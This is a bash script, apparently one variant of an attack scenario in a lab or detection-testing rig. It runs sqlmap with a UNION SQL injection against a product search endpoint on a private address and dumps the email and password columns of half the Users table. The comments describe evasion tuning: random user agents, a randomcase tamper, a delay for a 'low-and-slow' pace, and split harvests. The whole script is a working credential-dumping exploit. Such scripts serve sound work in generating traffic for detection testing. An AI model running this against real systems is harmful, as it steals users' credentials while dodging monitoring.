#!/usr/bin/env bash
# ATK-08 variant d: ATK-08.b's quiet, low-and-slow dump (--random-agent, randomcase tamper, D-35), but
# only the first half of Users (rows 1-163 of 325, sqlmap --start/--stop), so one harvest never takes
# every customer (D-63). --delay makes the half take 2-3 minutes. .e is the second half.
# Runs inside the rig's tools container only.
# tool: sqlmap 1.10.11
# label: quiet: sqlmap UNION dump of Users rows 1-163 with --random-agent, randomcase and --delay
set -eu
sqlmap -u 'http://10.66.0.10/rest/products/search?q=apple' -p q \
  --dbms=sqlite --technique=U --prefix="'))" --suffix='--' --no-cast --batch --answers='crack=N' \
  --random-agent --tamper=randomcase --delay=0.7 -T Users -C email,password --dump --start=1 --stop=163 \
  -t /out/traffic.txt --output-dir=/out/sqlmap
